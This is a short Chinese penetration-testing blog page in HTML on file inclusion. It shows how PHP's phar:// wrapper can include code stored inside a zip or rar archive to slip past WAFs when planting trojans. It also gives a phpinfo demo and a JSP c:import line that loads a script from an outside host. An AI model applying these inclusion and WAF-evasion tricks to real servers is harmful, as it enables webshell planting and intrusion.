<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>文件包含漏洞(新)</title>
<style>
			body{
				width: 100%;
				height: 100%;
				background-color:#B2DFEE;
			}
			*{
				margin: 0 auto;
				padding: 0;
			}
		</style>
		</head>
<body>
<div>


<br/><br/>
<!--文章title-->
<center>
<font style="FONT-FAMILY: Comic Sans MS;"><strong><h2>文件包含漏洞(新)</h2></strong></font>
</center>
<!--主体内容-->
<div><br/><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;文件包含漏洞是渗透测试过程中用得比较多的一个漏洞，主要用来绕过waf上传木马文件。今日在逛Tools论坛时，发现了一种新型的文件包含姿势，在此记录分享，并附上一些文件包含漏洞的基础利用姿势。</p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;特殊姿势】：利用phar://协议特性可以在渗透过程中帮我们绕过一些waf检测，phar:// 数据流包装器自 PHP 5.3.0 起开始有效，貌似可以绕过安全狗。</p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;利用过程】</p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;新建shell.php代码内容：<textarea rows=1 cols=50><?php include 'phar://test.rar/test.txt'; ?></textarea></p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;新建test.txt里的内容：<textarea rows=1 cols=50><?php phpinfo(); ?></textarea> </p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;压缩test.txt文件，可以重命名压缩文件为zip,phar,rar等格式，之后访问shell.php文件后，会出现phpinfo内容。</p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;<img src="./img/1.png"></p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;亲测有效】在实验环境下，在test目录下新建shell.php，test.txt，并将test.txt打包成test.zip。其中zip文件如下：</p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;<img src="./img/2.png"></p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;访问shell.php:</p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;<img src="./img/3.png"></p><br/>

<p>&nbsp;&nbsp;&nbsp;&nbsp;附加JSP：</p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;采用JSTL:<textarea rows=1 cols=50><c:import url="http://thief.one/1.jsp"></textarea></p><br/>
<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>参考链接:http://thief.one/2017/04/10/2/<br/>
</div><br/><br/>



<!--其他功能-->
<center>
<input type="button" name="button1" id="button1" value="返回上一页" onclick="history.go(-1)"> <br/><br/>
<script type="text/javascript">document.write(['<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=',encodeURIComponent(location.href),'&title=',encodeURIComponent(document.title),'" target="_blank"  style="text-decoration:none;"  title="分享到QQ空间">分享到QQ空间<\/a>'].join(''));</script>
</center>
</div>
<br/><br/>

</body>
</html>
